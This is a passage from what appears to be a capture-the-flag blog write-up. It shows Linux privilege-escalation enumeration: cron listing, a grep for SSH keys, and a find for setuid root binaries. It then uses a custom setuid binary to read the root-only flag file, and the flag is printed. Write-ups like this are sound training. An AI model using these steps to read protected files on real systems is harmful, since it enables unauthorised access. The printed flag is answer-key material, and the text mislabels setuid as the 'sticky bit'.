+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>ls -la /etc/cron.*/
+</span></span><span class=line><span class=cl>/etc/cron.d/:
+</span></span><span class=line><span class=cl>total 12
+</span></span><span class=line><span class=cl>drwxr-xr-x 2 root root 4096 Oct 13 14:09 .
+</span></span><span class=line><span class=cl>drwxr-xr-x 1 root root 4096 Dec  6 07:45 ..
+</span></span><span class=line><span class=cl>-rw-r--r-- 1 root root  201 Apr  8  2024 e2scrub_all
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>/etc/cron.daily/:
+</span></span><span class=line><span class=cl>total 16
+</span></span><span class=line><span class=cl>drwxr-xr-x 2 root root 4096 Oct 13 14:09 .
+</span></span><span class=line><span class=cl>drwxr-xr-x 1 root root 4096 Dec  6 07:45 ..
+</span></span><span class=line><span class=cl>-rwxr-xr-x 1 root root 1478 Mar 22  2024 apt-compat
+</span></span><span class=line><span class=cl>-rwxr-xr-x 1 root root  123 Feb  5  2024 dpkg
+</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>grep -rnw &#34;ssh-rsa&#34; /usr/* 2&gt;/dev/null | grep &#34;:1&#34;
+</span></span></code></pre></td></tr></table></div></div><ul><li>Nothing</li></ul><ol start=4><li>Let&rsquo;s find binaries with sticky bit set.</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>find / -user root -perm -4000 -exec ls -ldb {} \; 2&gt;/dev/nullev/null
+</span></span><span class=line><span class=cl>-rwsr-xr-x 1 root root 39384 Nov 30 09:15 /etc/security/print
+</span></span><span class=line><span class=cl>-rwsr-xr-x 1 root root 40664 May 30  2024 /usr/bin/newgrp
+</span></span><span class=line><span class=cl>-rwsr-xr-x 1 root root 72792 May 30  2024 /usr/bin/chfn
+</span></span><span class=line><span class=cl>-rwsr-xr-x 1 root root 76248 May 30  2024 /usr/bin/gpasswd
+</span></span><span class=line><span class=cl>-rwsr-xr-x 1 root root 64152 May 30  2024 /usr/bin/passwd
+</span></span><span class=line><span class=cl>-rwsr-xr-x 1 root root 55680 Jun  5  2025 /usr/bin/su
+</span></span><span class=line><span class=cl>-rwsr-xr-x 1 root root 51584 Jun  5  2025 /usr/bin/mount
+</span></span><span class=line><span class=cl>-rwsr-xr-x 1 root root 44760 May 30  2024 /usr/bin/chsh
+</span></span><span class=line><span class=cl>-rwsr-xr-x 1 root root 39296 Jun  5  2025 /usr/bin/umount
+</span></span></code></pre></td></tr></table></div></div><ol start=5><li>Ok, after hitting my head and bleeding heavily, I found that <code>/etc/security/print</code> enables us to read stuff as root. It is non-traditional binary with sticky bit set</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=n>ctfuser</span><span class=err>@</span><span class=mi>569</span><span class=n>cdb1b2a1d</span><span class=p>:</span><span class=o>/</span><span class=n>etc</span><span class=o>/</span><span class=n>security</span><span class=o>$</span> <span class=o>./</span><span class=nb>print</span> <span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>flag</span><span class=o>/</span><span class=n>flag</span>
+</span></span><span class=line><span class=cl><span class=o>./</span><span class=nb>print</span> <span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>flag</span><span class=o>/</span><span class=n>flag</span>
+</span></span><span class=line><span class=cl><span class=n>CURTIN_CTF</span><span class=p>{</span><span class=o>$</span><span class=mi>3</span><span class=n>tU1D</span><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div></section><footer class=article-footer><section class=article-tags><a href=/tags/ctf/>Ctf</a></section><section class=article-copyright><svg class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg>
+<span>Licensed under CC BY-NC-SA 4.0</span></section></footer></article><aside class=related-content--wrapper><h2 class=section-title>Related content</h2><div class=related-content><div class="flex article-list--tile"><article><a href=/p/reunionctf-2026-writeups/><div class=article-details><h2 class=article-title>ReunionCTF 2026 Writeups</h2></div></a></article><article><a href=/p/reunionctf-2026-writeup-confessions/><div class=article-details><h2 class=article-title>ReunionCTF 2026 Writeup - Confessions</h2></div></a></article></div></div></aside><footer class=site-footer><section class=copyright>&copy;
+2025 -
+2026 Froginacup's site</section><section class=powerby>Built with <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a><br>Theme <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.33.0>Stack</a></b> designed by <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a></section></footer><div class=pswp tabindex=-1 role=dialog aria-hidden=true><div class=pswp__bg></div><div class=pswp__scroll-wrap><div class=pswp__container><div class=pswp__item></div><div class=pswp__item></div><div class=pswp__item></div></div><div class="pswp__ui pswp__ui--hidden"><div class=pswp__top-bar><div class=pswp__counter></div><button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+<button class="pswp__button pswp__button--share" title=Share></button>
+<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button><div class=pswp__preloader><div class=pswp__preloader__icn><div class=pswp__preloader__cut><div class=pswp__preloader__donut></div></div></div></div></div><div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap"><div class=pswp__share-tooltip></div></div><button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+</button>
+<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button><div class=pswp__caption><div class=pswp__caption__center></div></div></div></div></div><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo=" crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU=" crossorigin=anonymous defer></script><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css crossorigin=anonymous><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css crossorigin=anonymous></main></div><script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z+KMkF24hUW8WePSA9HM=" crossorigin=anonymous></script><script type=text/javascript src=/ts/main.c922af694cc257bf1ecc41c0dd7b0430f9114ec280ccf67cd2c6ad55f5316c4e.js defer></script><script>(function(){const e=document.createElement("link");e.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",e.type="text/css",e.rel="stylesheet",document.head.appendChild(e)})()</script></body></html>
